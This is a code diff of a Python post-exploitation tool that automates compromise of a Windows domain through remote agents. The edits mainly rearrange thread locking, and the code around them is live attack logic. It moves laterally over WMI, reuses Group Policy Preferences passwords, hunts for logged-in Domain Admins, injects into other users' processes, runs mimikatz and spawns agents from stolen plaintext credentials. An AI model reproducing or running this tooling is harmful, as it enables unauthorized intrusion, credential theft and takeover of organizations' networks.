@@ -539,10 +539,9 @@ def spread(agent_name):
 
             print_info('Starting lateral movement', agent_name)
             if priority_targets:
-                with lock:
-                    for box in [target for target in priority_targets if target not in domain_controllers]:
-                        if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
-                            invoke_wmi(agent_name, box)
+                for box in [target for target in priority_targets if target not in domain_controllers]:
+                    if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
+                        invoke_wmi(agent_name, box)
 
             for box in find_localadmin_access(agent_name, no_ping=True, threads=args.threads):
                 # Do we have an agent on the box? if not pwn it
@@ -558,13 +557,12 @@ def privesc(agent_name):
         for result in gpp(agent_name):
             computers = get_gpo_computer(agent_name, result['guid'])
             for username, password in result['creds'].items():
-                with lock:
-                    for box in [target for target in priority_targets if target in computers]:
-                        if not agent_on_host(hostname=box):
-                            if '\\' not in username:
-                                # These are local accounts so we append '.\' to the username to specify it
-                                username = '.\\' + username
-                            invoke_wmi(agent_name, box, username=username, password=password)
+                for box in [target for target in priority_targets if target in computers]:
+                    if not agent_on_host(hostname=box):
+                        if '\\' not in username:
+                            # These are local accounts so we append '.\' to the username to specify it
+                            username = '.\\' + username
+                        invoke_wmi(agent_name, box, username=username, password=password)
 
             for username, password in result['creds'].items():
                 for box in computers:
@@ -591,8 +589,9 @@ def pwn_the_shit_out_of_everything(agent_name):
     for user in get_loggedon(agent_name):
         if user in domain_admins:
             print_good(colored('Found Domain Admin logged in: {}'.format(user), 'red', attrs=['bold']), agent_name)
-            with lock:
-                if agents[agent_name]['hostname'] not in priority_targets:
+
+            if agents[agent_name]['hostname'] not in priority_targets:
+                with lock:
                     priority_targets.append(agents[agent_name]['hostname'])
 
     spread_threads[agent_name] = KThread(target=spread, args=(agent_name,))
@@ -608,10 +607,10 @@ def pwn_the_shit_out_of_everything(agent_name):
 
         # This doesn't need to be explorer, change it at will ;)
         for process in tasklist(agent_name, process='explorer'):
-            with lock:
-                if process['username'] != agents[agent_name]['username'] and process['username'] != 'N/A' and process['username'] not in spread_usernames:
-                    print_info('Found process {} running under {}'.format(process['pid'], process['username']), agent_name)
-                    psinject(agent_name, process['pid'])
+            if process['username'] != agents[agent_name]['username'] and process['username'] != 'N/A' and process['username'] not in spread_usernames:
+                print_info('Found process {} running under {}'.format(process['pid'], process['username']), agent_name)
+                psinject(agent_name, process['pid'])
+                with lock:
                     psinject_usernames.append(process['username'])
 
         if not args.no_mimikatz and agents[agent_name]['os'].lower().find('windows 7') != -1:
@@ -628,11 +627,13 @@ def pwn_the_shit_out_of_everything(agent_name):
     for cred in get_stored_credentials()['creds']:
         if cred['credtype'] == 'plaintext':
             account = '{}\\{}'.format(cred['domain'].split('.')[0].upper(), cred['username'])
-            with lock:
-                if (account not in spread_usernames) and (account not in psinject_usernames) and (account not in spawned_usernames):
+
+            if (account not in spread_usernames) and (account not in psinject_usernames) and (account not in spawned_usernames):
+                with lock:
                     spawned_usernames.append(account)
-                    spawnas(agent_name, cred_id=cred['ID'])
-                    spawned_agents += 1
+
+                spawnas(agent_name, cred_id=cred['ID'])
+                spawned_agents += 1
 
         if spawned_agents == 2:
             break
@@ -702,9 +703,9 @@ def print_win_banner():
 def signal_handler(signal, frame):
     print('\n')
     print_info('Powering down...')
-    print_info('Killing recon threads')
-    for name, thread in recon_threads.items():
-        thread.kill()
+    #print_info('Killing recon threads')
+    #for name, thread in recon_threads.items():
+    #    thread.kill()
 
     print_info('Killing spread threads')
     for name, thread in spread_threads.items():
